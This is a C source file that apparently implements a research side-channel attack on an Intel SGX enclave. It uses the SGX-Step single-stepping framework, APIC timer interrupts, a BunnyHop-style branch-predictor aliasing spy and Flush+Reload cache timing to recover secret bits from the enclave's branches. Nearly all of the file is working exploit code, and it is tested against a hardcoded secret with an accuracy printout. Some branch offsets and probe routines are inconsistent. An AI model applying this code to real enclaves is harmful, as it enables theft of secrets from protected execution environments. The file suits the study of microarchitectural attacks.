#include <sgx_urts.h>
#include <signal.h>
#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>
#include <assemblyline.h>
#include <mastik/low.h>
#include <mastik/util.h>

#include "Enclave/encl_u.h"
#include "libsgxstep/apic.h"
#include "libsgxstep/config.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/elf_parser.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/idt.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/cache.h"

#define memory_barrier asm volatile ("sfence;\nmfence;\nlfence");
/* ============================================================
 * BRANCH INFO — from objdump
 *   0x10bf: je 0x10c6     (the if(bits[i]) branch)
 *   0x10c1: call secret_function  (bit=1 path)
 *   0x10c6: inc rdi               (bit=0 path, branch taken)
 *
 * BTB stores: branch at 0x10bf → target 0x10c6
 * So predicted_target = enclave_base + 0x10c6
 *
 * Cache HIT  after spy = BTB had entry = branch WAS taken = bit 0
 * Cache MISS after spy = BTB no entry  = branch NOT taken = bit 1
 * ============================================================ */

#define BRANCH_OFFSET           0x5021   /* JE instruction */
#define SECRET_CALL_OFFSET      0x5023   /* call secret_function */
//#define SPY_ALIAS_OFFSET        0x5023   /* call — what we alias spy to */
#define SECRET_FUNCTION_OFFSET  0x3000   /* target of call */
//#define PREDICTED_TARGET_OFFSET 0x3000   /* secret_function page */

/* secret the enclave processes */
#define SECRET_LEN 8
static uint8_t secret_bits[SECRET_LEN] = {1, 0, 1, 1, 0, 1, 0, 0};
uint64_t raw_cycles[SECRET_LEN] = {0};
/* cache threshold: below = hit, above = miss (cycles) */
#define CACHE_THRESHOLD 100

/* LOW_MASK and PAGEMASK from bunnyhop source */
#define LOW_MASK  0xFFFFFFFFULL
#define PAGEMASK  0xFFFULL
#define PAGELEN   4096

/* ===================== globals ===================== */
sgx_enclave_id_t eid  = 0;
int irq_cnt           = 0;
int do_irq            = 1;
uint64_t *pte_encl    = NULL;
uint64_t *pmd_encl    = NULL;

uint64_t branch_addr  = 0;
void    *predicted_target = NULL;
void   (*spy_func)(void)  = NULL;

int recovered[SECRET_LEN];
int rec_idx           = 0;
int waiting_for_result = 0;

uint64_t spy_alias_addr = 0;   /* aliased to the call, not the je */

#define MAX_LOG 20
uint64_t log_offset[MAX_LOG];
uint64_t log_cycles[MAX_LOG];
int      log_spy_result[MAX_LOG];
int      log_idx = 0;

/* ===================== AssemblyLine spy setup ===================== */

/*
 * Maps a page at (adrs & LOW_MASK) — keeping the lower 32 bits
 * so that (adrs & 0xFFFFFFFF) is preserved in the mapped address.
*/

uint8_t *probe_buf;
static inline void flush_probe(void *addr);
static inline uint32_t reload_probe(void *addr);

static void *create_buffer(uint64_t adrs, int size) {
    /* lower 32 bits we need to preserve */
    uint64_t lower32 = adrs & 0xFFFFFFFFULL;
    /* page offset within that */
    uint64_t page_offset = adrs & PAGEMASK;
    /* page-aligned lower 32 bits */
    uint64_t page_lower32 = lower32 & ~PAGEMASK;

    /* try different upper 32 bits until we find a free page */
    for (uint64_t upper = 0x100000000ULL;
         upper < 0x700000000000ULL;
         upper += 0x100000000ULL) {

        uint64_t try_addr = upper | page_lower32;

        /* skip if it overlaps with enclave memory */
        uint64_t enc_base = (uint64_t)get_enclave_base();
        if (try_addr >= enc_base && try_addr < enc_base + 0x200000)
            continue;

        void *buffer = mmap(
            (void *)try_addr,
            size,
            PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE | MAP_POPULATE,
            -1, 0
        );

        if (buffer != MAP_FAILED) {
                info("spy buffer mapped at %p (page_offset=0x%lx)", buffer, page_offset);
                return buffer;
        }
    }

    printf("create_buffer: all mmap attempts failed for adrs=%#lx\n", adrs);
    return NULL;
}
/*
 * Replicates genspy() from bunnyhop.c
 * Places N NOPs + RET at the aliased address using AssemblyLine.
 * The function pointer returned points to exactly (adrs & PAGEMASK)
 * within the mapped page — matching the lower 12 bits of the target.
 */
static void (*genspy(uint64_t adrs, int size, void *target))(void) {
    void *buffer = create_buffer(adrs, size);
    if (!buffer) return NULL;

    assemblyline_t al = asm_create_instance(
    buffer + (adrs & PAGEMASK), size
);

/* load target */
char instr[128];
snprintf(instr, sizeof(instr), "mov rax, 0x%lx", (uint64_t)target);
asm_assemble_str(al, instr);

/* call target safely */
asm_assemble_str(al, "call rax");

/* return cleanly */
asm_assemble_str(al, "ret");

    void (*func)(void) = asm_get_code(al);
    asm_destroy_instance(al);
    return func;
}

/* ===================== BunnyHop-Reload probe ===================== */

static inline void bhop_flush(void *addr) {
    asm volatile("clflush (%0)" :: "r"(addr) : "memory");
    asm volatile("mfence"       ::: "memory");
}

/*
 * Reload timing: measure cycles to access predicted_target.
 * Returns 1 (cache hit = branch taken = bit 0) or
 *         0 (cache miss = branch not taken = bit 1)
 *
 * Note: hit means bit=0 because je taken means bits[i]==0.
 */
static inline int bhop_reload(void *addr) {
    uint64_t t1, t2;
    asm volatile (
        "mfence\n\t"
        "rdtsc\n\t"
        "shl $32, %%rdx\n\t"
        "or %%rdx, %%rax\n\t"
        "mov %%rax, %0\n\t"
        "mov (%2), %%rbx\n\t"
        "rdtsc\n\t"
        "shl $32, %%rdx\n\t"
        "or %%rdx, %%rax\n\t"
        "mov %%rax, %1\n\t"
        "mfence\n\t"
        : "=r"(t1), "=r"(t2)
        : "r"(addr)
        : "rax", "rbx", "rdx", "memory"
    );
    return (t2 - t1) < CACHE_THRESHOLD ? 1 : 0;
}

/* ===================== AEP handler ===================== */

void aep_cb_func(void) {
    // printf("AEP start\n");
    uint64_t rip    = edbgrd_erip();
    uint64_t offset = rip - (uint64_t)get_enclave_base();

    /* keep 0x3000 cold AT ALL TIMES by flushing every step */
    // bhop_flush(predicted_target);

        if (rip == branch_addr){
        	/* Flush probe so we can detect fresh access */
            // printf("at branch\n");
        	flush_probe(probe_buf);

        	/* Mark that next step we measure */
        	waiting_for_result = 1;
	}
	else if (waiting_for_result){
		
        waiting_for_result = 0;

        /* Reload probe */
        // printf("before reload\n");
        uint32_t res = reload_probe(probe_buf);

        raw_cycles[rec_idx] = res;

        /* FAST → speculation happened */
        if (res < CACHE_THRESHOLD)
            recovered[rec_idx++] = 1;
        else
            recovered[rec_idx++] = 0;
	}
    

    irq_cnt++;
    if (do_irq && irq_cnt > 500000)
        do_irq = 0;

    mark_enclave_exec_not_accessed();

    if (do_irq) {
        apic_timer_irq(SGX_STEP_TIMER_INTERVAL);
    }
}

void fault_handler(int signal) {
    info("fault %d", signal);
    exit(1);
}

static inline void flush_probe(void *addr) {
    asm volatile("clflush (%0)" :: "r"(addr) : "memory");
    asm volatile("mfence" ::: "memory");
}

static inline uint32_t reload_probe(void *addr) {
    uint32_t lo, hi;
    uint64_t t1, t2;

    asm volatile (
        "mfence\n\t"
        "rdtsc\n\t"
        "lfence\n\t"
        : "=a"(lo), "=d"(hi)
        :
        : "memory"
    );
    t1 = ((uint64_t)hi << 32) | lo;

    *(volatile uint8_t *)addr;

    asm volatile (
        "lfence\n\t"
        "rdtsc\n\t"
        "lfence\n\t"
        : "=a"(lo), "=d"(hi)
        :
        : "memory"
    );
    t2 = ((uint64_t)hi << 32) | lo;

    return (uint32_t)(t2 - t1);
}

/* ===================== setup ===================== */

void attacker_config_runtime(void) {
    ASSERT(!claim_cpu(VICTIM_CPU));
    ASSERT(!prepare_system_for_benchmark(PSTATE_PCT));
    ASSERT(signal(SIGSEGV, fault_handler) != SIG_ERR);
    print_system_settings();
    register_enclave_info();
    print_enclave_info();
}

void attacker_config_page_table(void) {
    branch_addr = (uint64_t)get_enclave_base() + BRANCH_OFFSET;
    spy_alias_addr = branch_addr;

    info("branch addr = %#lx", branch_addr);
}


void setup_probe(void) {
	probe_buf = mmap(NULL, 4096,
    		PROT_READ | PROT_WRITE | PROT_EXEC,
    		MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	ASSERT(probe_buf != MAP_FAILED);

	/* touch it once so it's mapped */
	probe_buf[0] = 1;probe_buf[0] = 0x90;   // NOP
probe_buf[1] = 0x90;   // NOP
probe_buf[2] = 0xC3;   // RET

	info("probe buffer at %p", probe_buf);
}

void setup_spy(void) {
    info("setting up spy function at aliased address...");
	//spy_alias_addr = branch_addr;
	spy_func = genspy(spy_alias_addr, PAGELEN, probe_buf);
	ASSERT(spy_func != NULL);
	info("spy at %p → jumps to probe %p", spy_func, probe_buf);
}

/* ===================== main ===================== */

int main(int argc, char **argv) {
    sgx_launch_token_t token = {0};
    int updated = 0;
    idt_t idt = {0};

    
    info_event("Creating enclave...");
    SGX_ASSERT(sgx_create_enclave("./Enclave/encl.so", /*debug=*/1,
                                  &token, &updated, &eid, NULL));

    /* dry run to page in enclave memory */
    info("Dry run...");
    SGX_ASSERT(ecall_process_bits(eid, secret_bits, SECRET_LEN));

    /* setup */
    register_symbols("./Enclave/encl.so");
    attacker_config_runtime();
    attacker_config_page_table();
    setup_probe();
    setup_spy();      /* ← set up aliased spy function */
    for (int i = 0; i < 100; i++) {
    	spy_func();
    }	
    register_aep_cb(aep_cb_func);

    info_event("Setting up APIC/IDT");
    map_idt(&idt);
    install_kernel_irq_handler(&idt, __ss_irq_handler, IRQ_VECTOR);
    apic_timer_oneshot(IRQ_VECTOR);

    __ss_irq_fired = 0;
    apic_timer_irq(SGX_STEP_TIMER_INTERVAL);
    while (!__ss_irq_fired);
    info("APIC timer working");

    /* run the attack */
    info_event("Single-stepping enclave with BunnyHop-Reload...");
	__ss_irq_fired = 0;
apic_timer_irq(SGX_STEP_TIMER_INTERVAL);
    SGX_ASSERT(ecall_process_bits(eid, secret_bits, SECRET_LEN));


    info_event("Results:");
    printf("secret:    ");
    for (int i = 0; i < SECRET_LEN; i++) printf("%d ", secret_bits[i]);
    printf("\nrecovered: ");
    for (int i = 0; i < rec_idx; i++) printf("%d ", recovered[i]);
    printf("\ncycles:    ");
    for (int i = 0; i < rec_idx; i++) printf("%lu ", raw_cycles[i]);
    printf("\n");
    int correct = 0;
    for (int i = 0; i < rec_idx; i++)
        if (recovered[i] == secret_bits[i]) correct++;
    printf("accuracy:  %d/%d (%.0f%%)\n",
           correct, SECRET_LEN,
           (float)correct / SECRET_LEN * 100);

    
    SGX_ASSERT(sgx_destroy_enclave(eid));
    info("done. total IRQs: %d", irq_cnt);

    return 0;
}
